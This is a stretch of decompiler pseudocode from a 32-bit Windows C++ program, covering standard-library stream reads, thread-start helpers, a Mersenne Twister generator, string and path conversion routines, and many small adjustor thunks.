//----- (00427660) --------------------------------------------------------
int __thiscall sub_427660(_DWORD **this)
{
  int *v2; // ecx
  int v3; // eax
  _DWORD *v4; // eax
  unsigned __int8 *v5; // ecx
  int result; // eax
  _DWORD *v7; // ecx
  unsigned __int8 *v8; // edx

  if ( !*this[7] )
    goto LABEL_7;
  v2 = this[11];
  v3 = *v2;
  if ( *v2 > 1 )
  {
    *v2 = v3 - 1;
    v4 = this[7];
    v5 = (unsigned __int8 *)(*v4 + 1);
    *v4 = v5;
    return *v5;
  }
  if ( v3 > 0 )
  {
    *v2 = v3 - 1;
    v7 = this[7];
    v8 = (unsigned __int8 *)(*v7)++;
    result = *v8;
  }
  else
  {
LABEL_7:
    result = ((int (__thiscall *)(_DWORD **))(*this)[7])(this);
  }
  if ( result != -1 )
  {
    v5 = (unsigned __int8 *)*this[7];
    if ( v5 && (int)*this[11] > 0 )
      return *v5;
    return ((int (__thiscall *)(_DWORD **))(*this)[6])(this);
  }
  return result;
}

//----- (004276D0) --------------------------------------------------------
int __thiscall sub_4276D0(_DWORD **this)
{
  unsigned __int8 *v1; // edx

  v1 = (unsigned __int8 *)*this[7];
  if ( v1 && (int)*this[11] > 0 )
    return *v1;
  else
    return ((int (__thiscall *)(_DWORD **))(*this)[6])(this);
}

//----- (004276F0) --------------------------------------------------------
void __thiscall sub_4276F0(int this)
{
  int v2; // edi
  int v3; // eax
  int v4; // eax
  int v5; // eax
  void (__cdecl *v6)(int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // edx
  __int128 v7; // [esp-60h] [ebp-90h] BYREF
  __int64 v8; // [esp-50h] [ebp-80h]
  __int128 v9; // [esp-48h] [ebp-78h] BYREF
  __int64 v10; // [esp-38h] [ebp-68h]
  __int128 v11; // [esp-30h] [ebp-60h] BYREF
  __int64 v12; // [esp-20h] [ebp-50h]
  __int128 v13; // [esp-18h] [ebp-48h] BYREF
  __int64 v14; // [esp-8h] [ebp-38h]
  __int128 *v15; // [esp+Ch] [ebp-24h]
  __int128 *v16; // [esp+10h] [ebp-20h]
  __int128 *v17; // [esp+14h] [ebp-1Ch]
  __int128 *v18; // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  int v20; // [esp+2Ch] [ebp-4h]

  v2 = *(_DWORD *)(this + 16);
  *(_DWORD *)(this + 16) = 0;
  v19 = v2;
  v20 = 0;
  v3 = _Mtx_lock(*(_Mtx_t *)(this + 8));
  if ( v3 )
    std::_Throw_C_error(v3);
  HIDWORD(v14) = *(_DWORD *)(this + 4);
  *(_BYTE *)(this + 12) = 1;
  v4 = _Cnd_signal((_Cnd_t)HIDWORD(v14));
  if ( v4 )
    std::_Throw_C_error(v4);
  v5 = _Mtx_unlock(*(_Mtx_t *)(this + 8));
  if ( v5 )
    std::_Throw_C_error(v5);
  v6 = *(void (__cdecl **)(int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(v2 + 120);
  v17 = &v13;
  v14 = 0i64;
  v13 = *(_OWORD *)v2;
  v14 = *(_QWORD *)(v2 + 16);
  *(_DWORD *)(v2 + 16) = 0;
  *(_DWORD *)(v2 + 20) = 7;
  *(_WORD *)v2 = 0;
  LOBYTE(v20) = 1;
  v16 = &v11;
  v12 = 0i64;
  v11 = *(_OWORD *)(v2 + 24);
  v12 = *(_QWORD *)(v2 + 40);
  *(_DWORD *)(v2 + 40) = 0;
  *(_DWORD *)(v2 + 44) = 7;
  *(_WORD *)(v2 + 24) = 0;
  LOBYTE(v20) = 2;
  v15 = &v9;
  v10 = 0i64;
  v9 = *(_OWORD *)(v2 + 48);
  v10 = *(_QWORD *)(v2 + 64);
  *(_DWORD *)(v2 + 64) = 0;
  *(_DWORD *)(v2 + 68) = 7;
  *(_WORD *)(v2 + 48) = 0;
  LOBYTE(v20) = 3;
  v18 = &v7;
  v8 = 0i64;
  v7 = *(_OWORD *)(v2 + 72);
  v8 = *(_QWORD *)(v2 + 88);
  *(_DWORD *)(v2 + 88) = 0;
  *(_DWORD *)(v2 + 92) = 7;
  *(_WORD *)(v2 + 72) = 0;
  LOBYTE(v20) = 0;
  v6(
    v2 + 96,
    v7,
    DWORD1(v7),
    DWORD2(v7),
    HIDWORD(v7),
    v8,
    HIDWORD(v8),
    v9,
    DWORD1(v9),
    DWORD2(v9),
    HIDWORD(v9),
    v10,
    HIDWORD(v10),
    v11,
    DWORD1(v11),
    DWORD2(v11),
    HIDWORD(v11),
    v12,
    HIDWORD(v12),
    v13,
    DWORD1(v13),
    DWORD2(v13),
    HIDWORD(v13),
    v14,
    HIDWORD(v14));
  _Cnd_do_broadcast_at_thread_exit();
  v18 = (__int128 *)v2;
  v20 = -1;
  sub_425A10((_DWORD *)v2);
  HIDWORD(v14) = 124;
  sub_46C87D((void *)v2);
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (004278D0) --------------------------------------------------------
void __thiscall sub_4278D0(int this)
{
  int v2; // edi
  int v3; // eax
  int v4; // eax
  int v5; // eax
  void (__cdecl *v6)(int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // esi
  int v7; // ecx
  __int128 v8; // [esp-64h] [ebp-94h] BYREF
  __int64 v9; // [esp-54h] [ebp-84h]
  __int128 v10; // [esp-4Ch] [ebp-7Ch] BYREF
  __int64 v11; // [esp-3Ch] [ebp-6Ch]
  int v12; // [esp-34h] [ebp-64h]
  __int128 v13; // [esp-30h] [ebp-60h] BYREF
  __int64 v14; // [esp-20h] [ebp-50h]
  __int128 v15; // [esp-18h] [ebp-48h] BYREF
  __int64 v16; // [esp-8h] [ebp-38h]
  __int128 *v17; // [esp+Ch] [ebp-24h]
  __int128 *v18; // [esp+10h] [ebp-20h]
  __int128 *v19; // [esp+14h] [ebp-1Ch]
  __int128 *v20; // [esp+18h] [ebp-18h]
  int v21; // [esp+1Ch] [ebp-14h]
  int v22; // [esp+2Ch] [ebp-4h]

  v2 = *(_DWORD *)(this + 16);
  *(_DWORD *)(this + 16) = 0;
  v21 = v2;
  v22 = 0;
  v3 = _Mtx_lock(*(_Mtx_t *)(this + 8));
  if ( v3 )
    std::_Throw_C_error(v3);
  HIDWORD(v16) = *(_DWORD *)(this + 4);
  *(_BYTE *)(this + 12) = 1;
  v4 = _Cnd_signal((_Cnd_t)HIDWORD(v16));
  if ( v4 )
    std::_Throw_C_error(v4);
  v5 = _Mtx_unlock(*(_Mtx_t *)(this + 8));
  if ( v5 )
    std::_Throw_C_error(v5);
  v6 = *(void (__cdecl **)(int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(v2 + 124);
  v7 = *(_DWORD *)(v2 + 48);
  v19 = &v15;
  v16 = 0i64;
  v15 = *(_OWORD *)v2;
  v16 = *(_QWORD *)(v2 + 16);
  *(_DWORD *)(v2 + 16) = 0;
  *(_DWORD *)(v2 + 20) = 7;
  *(_WORD *)v2 = 0;
  LOBYTE(v22) = 1;
  v18 = &v13;
  v14 = 0i64;
  v13 = *(_OWORD *)(v2 + 24);
  v14 = *(_QWORD *)(v2 + 40);
  *(_DWORD *)(v2 + 40) = 0;
  *(_DWORD *)(v2 + 44) = 7;
  *(_WORD *)(v2 + 24) = 0;
  LOBYTE(v22) = 2;
  v12 = v7;
  v17 = &v10;
  v11 = 0i64;
  v10 = *(_OWORD *)(v2 + 52);
  v11 = *(_QWORD *)(v2 + 68);
  *(_DWORD *)(v2 + 68) = 0;
  *(_DWORD *)(v2 + 72) = 7;
  *(_WORD *)(v2 + 52) = 0;
  LOBYTE(v22) = 3;
  v20 = &v8;
  v9 = 0i64;
  v8 = *(_OWORD *)(v2 + 76);
  v9 = *(_QWORD *)(v2 + 92);
  *(_DWORD *)(v2 + 92) = 0;
  *(_DWORD *)(v2 + 96) = 15;
  *(_BYTE *)(v2 + 76) = 0;
  LOBYTE(v22) = 0;
  v6(
    v2 + 100,
    v8,
    DWORD1(v8),
    DWORD2(v8),
    HIDWORD(v8),
    v9,
    HIDWORD(v9),
    v10,
    DWORD1(v10),
    DWORD2(v10),
    HIDWORD(v10),
    v11,
    HIDWORD(v11),
    v12,
    v13,
    DWORD1(v13),
    DWORD2(v13),
    HIDWORD(v13),
    v14,
    HIDWORD(v14),
    v15,
    DWORD1(v15),
    DWORD2(v15),
    HIDWORD(v15),
    v16,
    HIDWORD(v16));
  _Cnd_do_broadcast_at_thread_exit();
  v20 = (__int128 *)v2;
  v22 = -1;
  sub_425AC0((_DWORD *)v2);
  HIDWORD(v16) = 128;
  sub_46C87D((void *)v2);
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00427AC0) --------------------------------------------------------
char __thiscall sub_427AC0(_BYTE *this, char a2)
{
  int v3; // ecx
  int v4; // eax
  int *v5; // eax
  int v6; // eax
  char *v7; // edi
  void (__thiscall ***v8)(_DWORD, int); // eax
  int i; // eax
  int v11; // [esp+0h] [ebp-34h] BYREF
  char v12[4]; // [esp+10h] [ebp-24h] BYREF
  int v13; // [esp+14h] [ebp-20h]
  _BYTE *v14; // [esp+18h] [ebp-1Ch]
  int v15; // [esp+1Ch] [ebp-18h]
  int *v16; // [esp+24h] [ebp-10h]
  int v17; // [esp+30h] [ebp-4h]
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v16 = &v11;
  v14 = this;
  v15 = 0;
  v3 = *(_DWORD *)this;
  v4 = *(_DWORD *)(v3 + 4);
  if ( !*(_DWORD *)&v14[v4 + 12] )
  {
    v5 = *(int **)&this[v4 + 60];
    if ( v5 )
    {
      sub_4212B0(v5);
      v3 = *(_DWORD *)this;
    }
    if ( !a2 )
    {
      v6 = *(_DWORD *)(v3 + 4);
      if ( (this[v6 + 20] & 1) != 0 )
      {
        v17 = 0;
        v13 = *(_DWORD *)(*(_DWORD *)&this[v6 + 48] + 4);
        (*(void (**)(void))(*(_DWORD *)v13 + 4))();
        v15 = 1;
        v7 = sub_421800((int)&savedregs, (int)v12);
        v15 = 0;
        v17 = -1;
        if ( v13 )
        {
          v8 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v13 + 8))(v13);
          if ( v8 )
            (**v8)(v8, 1);
        }
        v17 = 1;
        for ( i = sub_4276D0(*(_DWORD ***)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56]);
              ;
              i = sub_427660(*(_DWORD ***)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56]) )
        {
          if ( i == -1 )
          {
            sub_41F730((int)&this[*(_DWORD *)(*(_DWORD *)this + 4)], 1, 0);
            v17 = -1;
            goto LABEL_15;
          }
          if ( (*(_BYTE *)(*((_DWORD *)v7 + 3) + 2 * (unsigned __int8)i) & 0x48) == 0 )
            break;
        }
        v17 = -1;
      }
    }
LABEL_15:
    v3 = *(_DWORD *)this;
    if ( !*(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 12] )
      return 1;
  }
  sub_4036A0(
    &this[*(_DWORD *)(v3 + 4)],
    this[*(_DWORD *)(v3 + 4) + 12] | (4 * (*(_DWORD *)&this[*(_DWORD *)(v3 + 4) + 56] == 0) + 2),
    0);
  return 0;
}
// 427AC0: using guessed type char var_24[4];

//----- (00427C60) --------------------------------------------------------
int __thiscall sub_427C60(unsigned int *this)
{
  unsigned int *v1; // edi
  unsigned int v2; // eax
  _DWORD *v3; // edx
  int v4; // esi
  int v5; // ecx
  unsigned int v6; // ecx
  unsigned int v7; // eax
  _DWORD *v8; // ebx
  int v9; // edi
  int v10; // edi
  _DWORD *v11; // ebx
  unsigned int v12; // eax
  unsigned int v13; // edx
  int v14; // edx
  unsigned int v15; // edx

  v1 = this;
  v2 = *this;
  if ( *this == 624 )
  {
    v3 = this + 2;
    v4 = 624;
    do
    {
      v5 = *(v3++ - 1);
      v6 = *(v3 - 2) ^ (*(v3 - 1) ^ v5) & 0x7FFFFFFF;
      v3[622] = (v6 >> 1) ^ v3[395] ^ ((v6 & 1) != 0 ? 0x9908B0DF : 0);
      --v4;
    }
    while ( v4 );
    v2 = *v1;
  }
  else if ( v2 >= 0x4E0 )
  {
    v7 = this[625];
    v8 = this + 625;
    v9 = 227;
    do
    {
      *(v8 - 624) = ((v7 ^ (v7 ^ v8[1]) & 0x7FFFFFFF) >> 1) ^ v8[397] ^ ((v8[1] & 1) != 0 ? 0x9908B0DF : 0);
      v7 = *++v8;
      --v9;
    }
    while ( v9 );
    v10 = 396;
    v11 = this + 852;
    v12 = this[852];
    do
    {
      *(v11 - 624) = ((v12 ^ (v11[1] ^ v12) & 0x7FFFFFFF) >> 1) ^ *(v11 - 851) ^ ((v11[1] & 1) != 0 ? 0x9908B0DF : 0);
      v12 = *++v11;
      --v10;
    }
    while ( v10 );
    v1 = this;
    this[624] = ((this[1248] ^ (this[1] ^ this[1248]) & 0x7FFFFFFF) >> 1) ^ this[397] ^ ((this[1] & 1) != 0
                                                                                       ? 0x9908B0DF
                                                                                       : 0);
    v2 = 0;
    *this = 0;
  }
  v13 = v1[v2 + 1];
  *v1 = v2 + 1;
  v14 = (v13 >> 11) & v1[1249] ^ v13;
  v15 = (((((v14 & 0xFF3A58AD) << 7) ^ v14) & 0xFFFFDF8C) << 15) ^ ((v14 & 0xFF3A58AD) << 7) ^ v14;
  return v15 ^ (v15 >> 18);
}

//----- (00427DF0) --------------------------------------------------------
void **__thiscall sub_427DF0(void **this, char *a2, char *a3, int a4)
{
  void **result; // eax
  _DWORD v7[9]; // [esp+0h] [ebp-24h] BYREF

  v7[5] = v7;
  v7[4] = this;
  v7[8] = 0;
  while ( a2 != a3 )
    result = sub_419320(this, *a2++);
  return result;
}

//----- (00427E80) --------------------------------------------------------
WCHAR *__cdecl sub_427E80(int a1, const CHAR *a2, unsigned int a3)
{
  WCHAR *v3; // ecx
  WCHAR *v4; // esi
  unsigned int v5; // edi
  UINT v6; // eax
  __int64 v7; // rax
  unsigned int v8; // eax
  unsigned int v9; // ecx
  unsigned int v10; // ebx
  WCHAR *v11; // eax
  unsigned int v12; // edx
  WCHAR *v13; // eax
  char *v14; // edi
  int i; // ecx
  WCHAR *v16; // eax
  __int64 v17; // rax
  unsigned int v19; // [esp+18h] [ebp-24h]
  UINT v20; // [esp+1Ch] [ebp-20h]
  WCHAR *v21; // [esp+20h] [ebp-1Ch]
  int v22; // [esp+24h] [ebp-18h]
  unsigned int v23; // [esp+28h] [ebp-14h]
  WCHAR *v24; // [esp+28h] [ebp-14h]

  v4 = v3;
  v5 = a3;
  v22 = a3;
  v6 = __std_fs_code_page();
  v20 = v6;
  *((_DWORD *)v4 + 4) = 0;
  *((_DWORD *)v4 + 5) = 7;
  *v4 = 0;
  if ( a3 )
  {
    if ( a3 > 0x7FFFFFFF )
      sub_403C30();
    v7 = __std_fs_convert_narrow_to_wide(v6, a2, a3, 0, 0);
    v8 = sub_403CA0(v7, SHIDWORD(v7));
    v9 = *((_DWORD *)v4 + 4);
    v10 = v8;
    v19 = v9;
    if ( v8 > v9 )
    {
      v23 = *((_DWORD *)v4 + 5);
      v12 = v8 - v9;
      if ( v8 - v9 > v23 - v9 )
      {
        LOBYTE(v22) = 0;
        sub_4249A0(v4, v12, v22, v8 - v9, 0);
      }
      else
      {
        v13 = v4;
        *((_DWORD *)v4 + 4) = v10;
        v21 = v4;
        if ( v23 >= 8 )
        {
          v13 = *(WCHAR **)v4;
          v21 = *(WCHAR **)v4;
        }
        v24 = &v13[v9];
        if ( v12 )
        {
          memset(v24, 0, 4 * (v12 >> 1));
          v14 = (char *)&v24[2 * (v12 >> 1)];
          for ( i = v12 & 1; i; --i )
          {
            *(_WORD *)v14 = 0;
            v14 += 2;
          }
          v9 = v19;
          v5 = a3;
        }
        v21[v9 + v12] = 0;
      }
    }
    else
    {
      v11 = v4;
      if ( *((_DWORD *)v4 + 5) >= 8u )
        v11 = *(WCHAR **)v4;
      *((_DWORD *)v4 + 4) = v10;
      v11[v10] = 0;
    }
    v16 = v4;
    if ( *((_DWORD *)v4 + 5) >= 8u )
      v16 = *(WCHAR **)v4;
    v17 = __std_fs_convert_narrow_to_wide(v20, a2, v5, v16, v10);
    sub_403CA0(v17, SHIDWORD(v17));
  }
  return v4;
}
// 427EA8: variable 'v3' is possibly undefined
// 403C30: using guessed type void __noreturn sub_403C30(void);
// 469395: using guessed type _DWORD __stdcall __std_fs_code_page();
// 4693B2: using guessed type __int64 __stdcall __std_fs_convert_narrow_to_wide(UINT CodePage, LPCCH lpMultiByteStr, _DWORD cbMultiByte, LPWSTR lpWideCharStr, _DWORD cchWideChar);

//----- (00428030) --------------------------------------------------------
const void **__thiscall sub_428030(const void **this, size_t a2, unsigned int a3, char *Src, size_t Size)
{
  unsigned int v5; // edx
  size_t v7; // esi
  char *v8; // edx
  char *v10; // eax
  char *v11; // edx
  bool v12; // cf
  char *v13; // esi
  char *v14; // edx
  size_t v15; // esi
  int v16; // [esp+10h] [ebp-10h]
  unsigned int v17; // [esp+14h] [ebp-Ch]
  char *v18; // [esp+14h] [ebp-Ch]
  unsigned int v19; // [esp+18h] [ebp-8h]
  char *v20; // [esp+1Ch] [ebp-4h]

  v5 = a3;
  v7 = (size_t)this[4];
  if ( v7 < a2 )
    sub_421040();
  if ( v7 - a2 < a3 )
    v5 = v7 - a2;
  v17 = v5;
  if ( v5 == Size )
  {
    v8 = (char *)this;
    if ( (unsigned int)this[5] >= 0x10 )
      v8 = (char *)*this;
    memmove_0(&v8[a2], Src, Size);
    return this;
  }
  else
  {
    v16 = v7 - v5 - a2 + 1;
    v19 = Size - v5;
    if ( Size >= v5 )
    {
      if ( (char *)v19 > (char *)this[5] - v7 )
      {
        LOBYTE(v16) = 0;
        return sub_4281A0(this, v19, v16, a2, v5, Src, Size);
      }
      else
      {
        v18 = (char *)this;
        v12 = (unsigned int)this[5] < 0x10;
        this[4] = (const void *)(v7 + v19);
        if ( !v12 )
          v18 = (char *)*this;
        v20 = &v18[a2];
        v14 = &v18[a2 + v5];
        if ( &Src[Size] <= &v18[a2] || Src > &v18[v7] )
        {
          v15 = Size;
        }
        else if ( v14 > Src )
        {
          v15 = v14 - Src;
        }
        else
        {
          v15 = 0;
        }
        memmove_0(&v14[v19], v14, v16);
        memmove_0(v20, Src, v15);
        memmove(&v20[v15], &Src[v15 + v19], Size - v15);
        return this;
      }
    }
    else
    {
      v10 = (char *)(v7 + Size - v5);
      v11 = (char *)this;
      v12 = (unsigned int)this[5] < 0x10;
      this[4] = v10;
      if ( !v12 )
        v11 = (char *)*this;
      v13 = &v11[a2];
      memmove_0(&v11[a2], Src, Size);
      memmove_0(&v13[Size], &v13[v17], v16);
      return this;
    }
  }
}
// 421040: using guessed type void __noreturn sub_421040(void);

//----- (004281A0) --------------------------------------------------------
const void **__thiscall sub_4281A0(
        const void **Src,
        unsigned int a2,
        int a3,
        size_t Size,
        int a5,
        const void *a6,
        size_t a7)
{
  size_t v8; // edx
  unsigned int v9; // edi
  unsigned int v10; // esi
  unsigned int v11; // ecx
  size_t v12; // eax
  void *v13; // eax
  _DWORD *v14; // edi
  _DWORD *v15; // eax
  char *v16; // esi
  unsigned int v18; // [esp+14h] [ebp-Ch]
  void *v19; // [esp+18h] [ebp-8h]
  char *v20; // [esp+18h] [ebp-8h]
  size_t v21; // [esp+1Ch] [ebp-4h]
  size_t v22; // [esp+1Ch] [ebp-4h]

  v8 = (size_t)Src[4];
  v21 = v8;
  if ( 0x7FFFFFFF - v8 < a2 )
    sub_4257D0();
  v9 = (unsigned int)Src[5];
  v19 = (void *)(v8 + a2);
  v10 = (v8 + a2) | 0xF;
  v18 = v9;
  if ( v10 <= 0x7FFFFFFF )
  {
    if ( v9 <= 0x7FFFFFFF - (v9 >> 1) )
    {
      if ( v10 < v9 + (v9 >> 1) )
        v10 = v9 + (v9 >> 1);
    }
    else
    {
      v10 = 0x7FFFFFFF;
    }
  }
  else
  {
    v10 = 0x7FFFFFFF;
  }
  v11 = __CFADD__(v10, 1) ? -1 : v10 + 1;
  if ( v11 < 0x1000 )
  {
    if ( v11 )
    {
      v15 = operator new(__CFADD__(v10, 1) ? -1 : v10 + 1);
      v8 = v21;
      v14 = v15;
    }
    else
    {
      v14 = 0;
    }
  }
  else
  {
    v12 = v11 + 35;
    if ( v11 + 35 <= v11 )
      v12 = -1;
    v13 = operator new(v12);
    if ( !v13 )
      goto LABEL_23;
    v8 = v21;
    v14 = (_DWORD *)(((unsigned int)v13 + 35) & 0xFFFFFFE0);
    *(v14 - 1) = v13;
  }
  Src[4] = v19;
  Src[5] = (const void *)v10;
  v22 = v8 - Size - a5 + 1;
  v20 = (char *)v14 + Size + a7;
  if ( v18 >= 0x10 )
  {
    v16 = (char *)*Src;
    memmove(v14, *Src, Size);
    memmove((char *)v14 + Size, a6, a7);
    memmove(v20, &v16[Size + a5], v22);
    if ( v18 + 1 < 0x1000 )
    {
LABEL_20:
      sub_46C87D(v16);
      *Src = v14;
      return Src;
    }
    if ( (unsigned int)&v16[-*((_DWORD *)v16 - 1) - 4] <= 0x1F )
    {
      v16 = (char *)*((_DWORD *)v16 - 1);
      goto LABEL_20;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v14, Src, Size);
  memmove((char *)v14 + Size, a6, a7);
  memmove(v20, (char *)Src + Size + a5, v22);
  *Src = v14;
  return Src;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00428323) --------------------------------------------------------
_DWORD *__thiscall sub_428323(_DWORD *this, char a2)
{
  return sub_40A330(this - 1, a2);
}

//----- (00428333) --------------------------------------------------------
_DWORD *__thiscall sub_428333(_DWORD *this, char a2)
{
  return sub_406DE0(this - 1, a2);
}

//----- (0042833B) --------------------------------------------------------
char *__thiscall sub_42833B(_DWORD *this, char a2)
{
  return sub_41D010((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (00428343) --------------------------------------------------------
_DWORD *__thiscall sub_428343(_DWORD *this, char a2)
{
  return sub_41D220(this - 1, a2);
}

//----- (0042834B) --------------------------------------------------------
int __thiscall sub_42834B(_DWORD *this)
{
  return sub_4176F0(this - 12);
}

//----- (00428353) --------------------------------------------------------
int __thiscall sub_428353(_DWORD *this)
{
  return sub_4176D0(this - 10);
}

//----- (00428363) --------------------------------------------------------
_DWORD *__thiscall sub_428363(_DWORD *this, char a2)
{
  return sub_4083B0(this - 1, a2);
}

//----- (00428373) --------------------------------------------------------
_DWORD *__thiscall sub_428373(_DWORD *this, char a2)
{
  return sub_406F80(this - 1, a2);
}

//----- (0042837B) --------------------------------------------------------
_DWORD *__thiscall sub_42837B(_DWORD *this, char a2)
{
  return sub_41C980(this - 1, a2);
}

//----- (00428383) --------------------------------------------------------
_DWORD *__thiscall sub_428383(_DWORD *this, char a2)
{
  return sub_40A330(this - 2, a2);
}

//----- (0042838B) --------------------------------------------------------
_DWORD *__thiscall sub_42838B(_DWORD *this, char a2)
{
  return sub_41D220(this - 2, a2);
}

//----- (00428393) --------------------------------------------------------
_DWORD *__thiscall sub_428393(_DWORD *this, char a2)
{
  return sub_408010(this - 1, a2);
}

//----- (0042839B) --------------------------------------------------------
void __thiscall sub_42839B(int *this, int *a2)
{
  sub_408CB0(this - 15, a2);
}

//----- (004283A3) --------------------------------------------------------
_DWORD *__thiscall sub_4283A3(_DWORD *this, char a2)
{
  return sub_4082A0(this - 1, a2);
}

//----- (004283AB) --------------------------------------------------------
_DWORD *__thiscall sub_4283AB(_DWORD *this, char a2)
{
  return sub_406EE0(this - 1, a2);
}

//----- (004283BB) --------------------------------------------------------
_DWORD *__thiscall sub_4283BB(_DWORD *this, char a2)
{
  return sub_407D20(this - 1, a2);
}

//----- (004283CB) --------------------------------------------------------
int __thiscall sub_4283CB(_DWORD *this, int a2)
{
  return sub_417AB0(this - 6, a2);
}

//----- (004283D3) --------------------------------------------------------
void __thiscall sub_4283D3(int *this, int a2)
{
  sub_408CC0(this - 15, a2);
}

//----- (004283E3) --------------------------------------------------------
int __thiscall sub_4283E3(_DWORD *this, int a2)
{
  return sub_417DD0(this - 6, a2);
}

//----- (004283EB) --------------------------------------------------------
_DWORD *__thiscall sub_4283EB(_DWORD *this, char a2)
{
  return sub_41CCF0((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (004283F3) --------------------------------------------------------
char *__thiscall sub_4283F3(_DWORD *this, char a2)
{
  return sub_41CD70((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (004283FB) --------------------------------------------------------
char *__thiscall sub_4283FB(char *this, char a2)
{
  return sub_41CFB0(&this[-*((_DWORD *)this - 1)], a2);
}

//----- (00428403) --------------------------------------------------------
_DWORD *__thiscall sub_428403(_DWORD *this, char a2)
{
  return sub_408B30(this - 2, a2);
}

//----- (00428413) --------------------------------------------------------
void *__thiscall sub_428413(char *this, char a2)
{
  return sub_4071A0(this - 4, a2);
}

//----- (0042841B) --------------------------------------------------------
_DWORD *__thiscall sub_42841B(_DWORD *this, char a2)
{
  return sub_414AF0(this - 15, a2);
}

//----- (00428423) --------------------------------------------------------
_DWORD *__thiscall sub_428423(_DWORD *this, char a2)
{
  return sub_408BD0(this - 13, a2);
}

//----- (00428433) --------------------------------------------------------
char *__thiscall sub_428433(_DWORD *this, char a2)
{
  return sub_41D0A0((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (0042843B) --------------------------------------------------------
int __thiscall sub_42843B(_DWORD *this, int a2)
{
  return sub_408500(this - 1, a2);
}

//----- (00428443) --------------------------------------------------------
char *__thiscall sub_428443(char *this, char a2)
{
  return sub_41CF80(&this[-*((_DWORD *)this - 1)], a2);
}

//----- (0042844B) --------------------------------------------------------
int __thiscall sub_42844B(_DWORD *this)
{
  return sub_4176E0(this - 10);
}

//----- (00428453) --------------------------------------------------------
char *__thiscall sub_428453(_DWORD *this, char a2)
{
  return sub_41CC60((_DWORD *)((char *)this - *(this - 1)), a2);
}

//----- (0042845B) --------------------------------------------------------
_DWORD *__thiscall sub_42845B(_DWORD *this, char a2)
{
  return sub_41C820(this - 1, a2);
}

//----- (00428463) --------------------------------------------------------
_DWORD *__thiscall sub_428463(_DWORD *this, char a2)
{
  return sub_4074E0(this - 1, a2);
}

//----- (0042846B) --------------------------------------------------------
char *__thiscall sub_42846B(_DWORD *this, char a2)
{
  return sub_41CE00((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (00428473) --------------------------------------------------------
_DWORD *__thiscall sub_428473(_DWORD *this, char a2)
{
  return sub_414AF0(this - 16, a2);
}

//----- (0042847B) --------------------------------------------------------
int __thiscall sub_42847B(_DWORD *this, int a2)
{
  return sub_417B10(this - 11, a2);
}

//----- (0042848B) --------------------------------------------------------
_DWORD *__thiscall sub_42848B(_DWORD *this, char a2)
{
  return sub_414AF0(this - 1, a2);
}

//----- (00428493) --------------------------------------------------------
int __thiscall sub_428493(_DWORD *this)
{
  return sub_461210(this - 1);
}

//----- (004284A3) --------------------------------------------------------
_DWORD *__thiscall sub_4284A3(_DWORD *this, char a2)
{
  return sub_40A650(this - 15, a2);
}

//----- (004284AB) --------------------------------------------------------
_DWORD *__thiscall sub_4284AB(_DWORD *this, char a2)
{
  return sub_407B90(this - 1, a2);
}

//----- (004284B3) --------------------------------------------------------
_DWORD *__thiscall sub_4284B3(_DWORD *this, char a2)
{
  return sub_41CA90(this - 1, a2);
}

//----- (004284BB) --------------------------------------------------------
int __thiscall sub_4284BB(_DWORD *this)
{
  return sub_417700(this - 12);
}

//----- (004284D3) --------------------------------------------------------
char *__thiscall sub_4284D3(_DWORD *this, char a2)
{
  return sub_41CC90((_DWORD *)((char *)this - *(this - 1)), a2);
}

//----- (004284DB) --------------------------------------------------------
_DWORD *__thiscall sub_4284DB(_DWORD *this, char a2)
{
  return sub_407110(this - 1, a2);
}

//----- (004284E3) --------------------------------------------------------
_DWORD *__thiscall sub_4284E3(_DWORD *this, char a2)
{
  return sub_414AF0(this - 65, a2);
}

//----- (004284EE) --------------------------------------------------------
_DWORD *__thiscall sub_4284EE(_DWORD *this, char a2)
{
  return sub_40A650(this - 1, a2);
}

//----- (004284F6) --------------------------------------------------------
int __thiscall sub_4284F6(_DWORD *this, int a2)
{
  return sub_408650(this - 1, a2);
}

//----- (004284FE) --------------------------------------------------------
int __thiscall sub_4284FE(_DWORD *this, int a2)
{
  return sub_417AB0(this - 11, a2);
}

//----- (00428506) --------------------------------------------------------
_DWORD *__thiscall sub_428506(_DWORD *this, char a2)
{
  return sub_409080(this - 1, a2);
}

//----- (0042850E) --------------------------------------------------------
_DWORD *__stdcall sub_42850E(_DWORD *a1)
{
  return sub_408CF0(a1);
}

//----- (00428516) --------------------------------------------------------
int __thiscall sub_428516(_DWORD *this, int a2)
{
  return sub_417DD0(this - 11, a2);
}

//----- (00428520) --------------------------------------------------------
